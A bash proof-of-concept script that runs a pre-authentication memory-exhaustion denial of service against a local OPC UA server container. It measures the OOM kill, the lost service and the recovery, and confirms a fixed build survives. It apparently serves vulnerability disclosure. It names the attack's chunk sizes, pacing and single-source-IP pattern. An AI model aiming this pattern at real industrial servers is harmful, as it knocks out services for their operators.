#!/usr/bin/env bash
#
# UASC pre-authentication memory-leak PoC -- Scenario B: container memory limit, no
# protective direct-memory cap (the common Docker/Kubernetes deployment shape). Drives the
# server to ACTUAL unavailability (not just a memory graph) and proves it eight ways:
#
#   1. legitimate client works BEFORE the attack
#   2. accepted connection count and exact bytes sent are recorded
#   3. direct memory AND container RSS grow
#   4. the kernel records OOMKilled=true, ExitCode=137
#   5. the legitimate OPC UA client FAILS during/after
#   6. an unrelated co-located workload in the same JVM (the heartbeat thread in
#      VictimServer, zero dependency on Netty/OPC UA) also stops -- process-wide blast
#      radius, not a per-connection failure
#   7. service returns only after a restart
#   8. the fixed 1.1.5 build survives the IDENTICAL attack sequence (same single source
#      IP, same connection/byte pattern, same duration) and keeps serving the legit client
#
# HEADLINE mode is a SINGLE source IP (the least-arguable case -- a reviewer can't
# dismiss it as "you just used more machines"). A 4-source-IP run is available via
# MODE=multi purely as a labeled acceleration comparison, never as the primary claim.
#
# Exit code is machine-checked: 0 only if the observed outcome matches what this build
# is expected to do (vulnerable -> OOM-kill, fixed -> survive); 1 on any mismatch.
#
# Usage: ./scenarioB.sh <APP_IMAGE:TAG> <LABEL> <RESULTS_FILE> [MEMORY_LIMIT] [MODE] [DURATION_SEC] [MIN_ACCEPTED_CONNS]
#
# IMPORTANT on the legitimate-client probe: it does NOT run as a container resolving the
# server by its Docker-network hostname. Docker's embedded DNS deregisters a container's
# network alias the instant it exits -- even before `docker rm` -- so a probe that dials
# "opc.tcp://server:12686/milo" fails with java.net.UnknownHostException once the server
# is OOM-killed. That is a true fact (the container is gone) but it is a DNS artifact, not
# proof that "the OPC UA service" refused the connection -- a reviewer could fairly say
# this only proves the container vanished. Instead, the server's port is published to the
# host (`-p 12686:12686`) and the legitimate client runs as a plain HOST process (java,
# not docker run) dialing "opc.tcp://127.0.0.1:12686/milo". 127.0.0.1 always resolves, so
# a failure there is a genuine transport-level refusal/timeout against a resolvable
# endpoint -- exactly the failure mode of "the service is down", not "the name is gone".
set -u
cd "$(dirname "$0")"

JAVA_HOME="${JAVA_HOME:-}"
if [ -z "$JAVA_HOME" ]; then
  for c in "$(mise where java 2>/dev/null)" "/Users/abhinavagarwal/.local/share/mise/installs/java/temurin-17.0.19+10"; do
    if [ -n "$c" ] && [ -x "$c/bin/java" ]; then JAVA_HOME="$c"; break; fi
  done
fi
export JAVA_HOME
export PATH="$JAVA_HOME/bin:$PATH"

APP_IMAGE="${1:-memory-leak-app:1.1.4}"
LABEL="${2:-vulnerable-1.1.4}"
RESULTS="${3:-scenarioB-${LABEL}.log}"
MEMORY_LIMIT="${4:-550m}"
MODE="${5:-single}"                # single (headline) | multi (acceleration comparison)
DURATION_SEC="${6:-180}"
MIN_ACCEPTED_CONNS="${7:-0}"        # fixed-build run: assert accepted conns >= this

# The host-side legit-client jar matching this image's Milo version (image tag == version).
MILO_TAG="${APP_IMAGE##*:}"
LEGIT_JAR="victim-server/target-versions/victim-server-${MILO_TAG}.jar"
if [ ! -f "$LEGIT_JAR" ]; then
  echo "ERROR: $LEGIT_JAR not found -- build it first (see run.sh)." >&2
  exit 2
fi
HOST_PORT=12686

# Expected outcome inferred from the label unless EXPECT is set explicitly.
EXPECT="${EXPECT:-}"
if [ -z "$EXPECT" ]; then
  case "$LABEL" in
    *vulnerable*) EXPECT="oomkill" ;;
    *fixed*)      EXPECT="survive" ;;
    *)            EXPECT="unknown" ;;
  esac
fi

ATK_IMAGE=memory-leak-attacker:latest
NET=memory-leak-net
SVR=memory-leak-svr
CHUNKS_PER_CONN=64
CHUNK_SIZE=65535
INTER_CONN_SLEEP=0.30
N_ATTACKERS=1
[ "$MODE" = "multi" ] && N_ATTACKERS=4

: > "$RESULTS"
log(){ echo "$@" | tee -a "$RESULTS"; }
hr(){ log "============================================================"; }
FAIL_REASONS=()
fail(){ FAIL_REASONS+=("$1"); log "    !! CHECK FAILED: $1"; }

hr; log "UASC pre-authentication memory-leak PoC -- Scenario B  label=$LABEL image=$APP_IMAGE mode=$MODE  $(date -u +%FT%TZ)"; hr
log "environment: $(uname -s) $(uname -r) / docker $(docker --version 2>/dev/null)"
log "container --memory=$MEMORY_LIMIT --memory-swap=$MEMORY_LIMIT  -Xmx128m -XX:MaxDirectMemorySize=512m"
log "(the JVM's own direct cap is set deliberately high so it never binds; the cgroup"
log " limit is the actual constraint -- this is the common containerized deployment shape)"
log "attacker: mode=$MODE sourceIPs=$N_ATTACKERS chunksPerConn=$CHUNKS_PER_CONN chunkSize=$CHUNK_SIZE"
log "          interConnSleep=${INTER_CONN_SLEEP}s durationSec=$DURATION_SEC (identical across vulnerable/fixed runs)"
log "expected outcome for this build: $EXPECT"

docker network rm "$NET" >/dev/null 2>&1
docker network create "$NET" >>"$RESULTS" 2>&1

LEGIT() {
  # Host-side process, published port, resolvable 127.0.0.1 target -- see the note at the
  # top of this file on why this is NOT a `docker run --network ... server:12686` probe.
  java -Dlegit.timeout.sec=20 -Dorg.slf4j.simpleLogger.defaultLogLevel=warn \
    -cp "$LEGIT_JAR" poc.LegitClient "opc.tcp://127.0.0.1:${HOST_PORT}/milo" 2>&1 \
    | grep -E 'LEGIT_CLIENT_RESULT' | tail -1
}
last_heartbeat() { docker logs "$SVR" 2>/dev/null | grep -o 'HEARTBEAT seq=[0-9]* ts=[0-9]*' | tail -1; }
last_pinned()     { docker logs "$SVR" 2>/dev/null | grep -o 'pinnedDirectBytes=[0-9]*' | tail -1 | cut -d= -f2; }
mib() { awk -v b="${1:-0}" 'BEGIN{printf "%.2f", b/1048576}'; }

docker rm -f "$SVR" >/dev/null 2>&1
log ""; log "[1/8] Start server (container-memory-bounded, no protective direct cap, heartbeat active)"
docker run -d --name "$SVR" --hostname server --network "$NET" \
  -p "${HOST_PORT}:12686" \
  --memory="$MEMORY_LIMIT" --memory-swap="$MEMORY_LIMIT" \
  "$APP_IMAGE" \
  -Xmx128m -XX:MaxDirectMemorySize=512m \
  -Dorg.slf4j.simpleLogger.defaultLogLevel=warn -cp /app/victim-server.jar poc.VictimServer >>"$RESULTS" 2>&1
n=0
until docker logs "$SVR" 2>&1 | grep -q POC_SERVER_READY; do
  sleep 1; n=$((n+1)); [ "$n" -gt 60 ] && { log "ERROR: server did not become ready"; break; }
done
sleep 3

# --- Proof point 1: legitimate client works BEFORE the attack -------------------------
BASE_RESULT=$(LEGIT)
log "    [1] legit BEFORE attack : $BASE_RESULT"
echo "$BASE_RESULT" | grep -q SUCCESS || fail "legit client did not succeed BEFORE the attack -- baseline is broken, results below are not meaningful"
IDLE_MEM=$(docker stats --no-stream --format '{{.MemUsage}}' "$SVR" 2>/dev/null)
log "    idle RSS            : $IDLE_MEM"
HB_BEFORE=$(last_heartbeat)
log "    co-located heartbeat BEFORE attack : $HB_BEFORE"

log ""; log "[2/8] Launch attacker(s): mode=$MODE, $N_ATTACKERS source IP(s), identical chunk pattern"
for k in $(seq 1 "$N_ATTACKERS"); do
  docker rm -f "memory-leak-atk${k}" >/dev/null 2>&1
  docker run -d --name "memory-leak-atk${k}" --network "$NET" \
    -e TARGET_HOST=server -e TARGET_PORT=12686 -e ENDPOINT_URL=opc.tcp://server:12686/milo \
    -e DURATION_SEC="$DURATION_SEC" -e CHUNKS_PER_CONN="$CHUNKS_PER_CONN" -e CHUNK_SIZE="$CHUNK_SIZE" \
    -e INTER_CONN_SLEEP="$INTER_CONN_SLEEP" "$ATK_IMAGE" >>"$RESULTS" 2>&1
done
log "    ${N_ATTACKERS} attacker container(s) started against opc.tcp://server:12686/milo (non-loopback bridge peer,"
log "    so RateLimitingHandler is NOT exempted -- it is genuinely active throughout)"

log ""; log "[3/8] Watch server state for up to ${DURATION_SEC}s (direct memory + container RSS + heartbeat)"
DIED=0; OOMKILLED=0; KILL_T=""
STEPS=$(( (DURATION_SEC + 20) / 2 ))
for t in $(seq 1 "$STEPS"); do
  sleep 2
  ST=$(docker inspect -f '{{.State.Status}} oom={{.State.OOMKilled}} exit={{.State.ExitCode}}' "$SVR" 2>/dev/null)
  RSS=$(docker stats --no-stream --format '{{.MemUsage}}' "$SVR" 2>/dev/null)
  PINNED=$(last_pinned)
  if [ $((t % 3)) -eq 0 ]; then
    log "    t+$((t*2))s server=[$ST] containerMem=[$RSS] pinnedDirect=$(mib "${PINNED:-0}")MiB"
  fi
  if echo "$ST" | grep -qE 'exited|dead'; then
    DIED=1; KILL_T=$((t*2))
    echo "$ST" | grep -q 'oom=true' && OOMKILLED=1
    log "    >>> SERVER EXITED at ~t+${KILL_T}s: [$ST]"
    break
  fi
done

# --- Proof point 3/4: memory grew, kernel OOM-kill recorded ----------------------------
FINAL_STATE=$(docker inspect -f 'status={{.State.Status}} OOMKilled={{.State.OOMKilled}} ExitCode={{.State.ExitCode}}' "$SVR" 2>/dev/null)
log ""; log "[4/8] Final server state: $FINAL_STATE"
if [ "$DIED" -eq 1 ] && [ "$OOMKILLED" -ne 1 ]; then
  fail "container exited but was NOT OOMKilled=true -- not the intended scenario, see server logs"
fi

# --- Proof point 2: exact accepted connections + bytes sent ---------------------------
log ""; log "[5/8] Stop attacker(s); collect exact accepted-connection / byte-count evidence"
TOTAL_LEAKING=0; TOTAL_THROTTLED=0; TOTAL_BYTES=0
BYTES_PER_CONN=$((CHUNKS_PER_CONN * CHUNK_SIZE))
for k in $(seq 1 "$N_ATTACKERS"); do
  OUT=$(docker logs "memory-leak-atk${k}" 2>&1)
  # Prefer the final "ATTACKER done ..." summary line if the attacker ran to completion;
  # otherwise (the common case here -- the server died and the attacker was killed mid-run)
  # fall back to counting the per-connection "LEAK conn#" lines it prints incrementally, so
  # a connection/byte count is never silently reported as zero just because we didn't wait
  # for the attacker's own exit.
  L=$(echo "$OUT" | grep -Eo 'leakingConns=[0-9]+' | tail -1 | cut -d= -f2)
  TH=$(echo "$OUT" | grep -Eo 'throttledConns=[0-9]+' | tail -1 | cut -d= -f2)
  if [ -z "$L" ]; then L=$(echo "$OUT" | grep -c 'LEAK conn#'); fi
  L=${L:-0}; TH=${TH:-0}
  B=$((L * BYTES_PER_CONN))
  log "    attacker[$k]: acceptedConns=$L throttledConns=$TH bytesSent=$B"
  TOTAL_LEAKING=$((TOTAL_LEAKING + L))
  TOTAL_THROTTLED=$((TOTAL_THROTTLED + TH))
  TOTAL_BYTES=$((TOTAL_BYTES + B))
  docker rm -f "memory-leak-atk${k}" >/dev/null 2>&1
done
log "    TOTAL across $N_ATTACKERS source IP(s): acceptedConns=$TOTAL_LEAKING throttledConns=$TOTAL_THROTTLED bytesSent=$TOTAL_BYTES ($(mib "$TOTAL_BYTES") MiB)"
if [ -n "$MIN_ACCEPTED_CONNS" ] && [ "$MIN_ACCEPTED_CONNS" -gt 0 ]; then
  log "    identical-sequence check: required acceptedConns >= $MIN_ACCEPTED_CONNS (from the paired run)"
  [ "$TOTAL_LEAKING" -ge "$MIN_ACCEPTED_CONNS" ] || fail "acceptedConns=$TOTAL_LEAKING is LESS than the paired run's $MIN_ACCEPTED_CONNS -- not a fair identical-sequence comparison"
fi

# --- Proof point 5: legitimate client FAILS during/after ------------------------------
log ""; log "[6/8] Legitimate client AFTER the attack (server is dead, or still alive if it survived)"
DENY_RESULT=$(LEGIT)
log "    [5] legit AFTER attack : $DENY_RESULT"
if [ "$DIED" -eq 1 ]; then
  echo "$DENY_RESULT" | grep -q FAILURE || fail "server was OOM-killed but the legit client still reported SUCCESS (unexpected)"
else
  echo "$DENY_RESULT" | grep -q SUCCESS || fail "server survived but the legit client FAILED (unexpected)"
fi

# --- Proof point 6: co-located, unrelated workload also stops (process-wide blast radius) --
log ""; log "[7/8] Co-located unrelated workload (heartbeat thread, no Netty/OPC UA dependency)"
if [ "$DIED" -eq 1 ]; then
  HB_LAST=$(docker logs "$SVR" 2>&1 | grep -o 'HEARTBEAT seq=[0-9]* ts=[0-9]*' | tail -1)
  log "    last heartbeat before death : $HB_LAST"
  log "    co-located workload verdict : STOPPED (process-wide -- the container is gone, so"
  log "    this unrelated counter thread died too, even though it never touched OPC UA/Netty)"
else
  sleep 2
  HB1=$(last_heartbeat); sleep 2; HB2=$(last_heartbeat)
  log "    heartbeat sample 1 : $HB1"
  log "    heartbeat sample 2 : $HB2"
  if [ "$HB1" = "$HB2" ] || [ -z "$HB2" ]; then
    fail "server survived but the co-located heartbeat is not advancing (unexpected)"
  else
    log "    co-located workload verdict : RUNNING (still incrementing -- process healthy)"
  fi
fi

# --- Proof point 7: service returns only after restart --------------------------------
log ""; log "[8/8] Recovery: restart server, only restart recovers"
RECOVER_RESULT="n/a (server never died)"
if [ "$DIED" -eq 1 ]; then
  docker start "$SVR" >>"$RESULTS" 2>&1
  sleep 6
  RECOVER_RESULT=$(LEGIT)
  log "    [7] legit AFTER restart : $RECOVER_RESULT"
  echo "$RECOVER_RESULT" | grep -q SUCCESS || fail "server was restarted but the legit client still FAILED (unexpected)"
fi

docker rm -f "$SVR" >/dev/null 2>&1
docker network rm "$NET" >>"$RESULTS" 2>&1

ACTUAL="unknown"
if [ "$DIED" -eq 1 ] && [ "$OOMKILLED" -eq 1 ]; then ACTUAL="oomkill"; fi
if [ "$DIED" -eq 0 ]; then ACTUAL="survive"; fi
if [ "$EXPECT" != "unknown" ] && [ "$ACTUAL" != "$EXPECT" ]; then
  fail "expected outcome '$EXPECT' but observed '$ACTUAL'"
fi

VERDICT="PASS"
EXIT_CODE=0
if [ "${#FAIL_REASONS[@]}" -gt 0 ]; then
  VERDICT="FAIL"
  EXIT_CODE=1
fi

hr; log "MACHINE-CHECKED VERDICT[$LABEL]: $VERDICT (exit $EXIT_CODE)"; hr
if [ "$VERDICT" = "FAIL" ]; then
  for r in "${FAIL_REASONS[@]}"; do log "  - $r"; done
fi

hr; log "SCREENSHOT SUMMARY -- $LABEL ($MODE, $N_ATTACKERS source IP)"; hr
log "Legitimate client before attack: $(echo "$BASE_RESULT" | grep -q SUCCESS && echo OK || echo FAILED)"
log "Attacker: $([ "$N_ATTACKERS" -eq 1 ] && echo "single source IP" || echo "${N_ATTACKERS} source IPs"), ${TOTAL_LEAKING} connections, $(mib "$TOTAL_BYTES") MiB sent"
log "Server direct memory: 0 -> $(mib "${PINNED:-0}")MiB (cap 512m; container limit ${MEMORY_LIMIT} is the binding constraint)"
if [ "$DIED" -eq 1 ]; then
  log "Container: OOMKilled=${OOMKILLED} ExitCode=137 after ~${KILL_T}s"
else
  log "Container: OOMKilled=false ExitCode=0 (survived full ${DURATION_SEC}s attack)"
fi
log "Legitimate client after attack: $(echo "$DENY_RESULT" | grep -q SUCCESS && echo OK || echo FAILED)"
if [ "$DIED" -eq 1 ]; then
  log "Co-located workload: STOPPED (process-wide)"
  log "Legitimate client after restart: $(echo "$RECOVER_RESULT" | grep -q SUCCESS && echo OK || echo FAILED)"
else
  log "Co-located workload: RUNNING (process healthy)"
fi
hr
log "transcript: $(pwd)/$RESULTS"
exit $EXIT_CODE
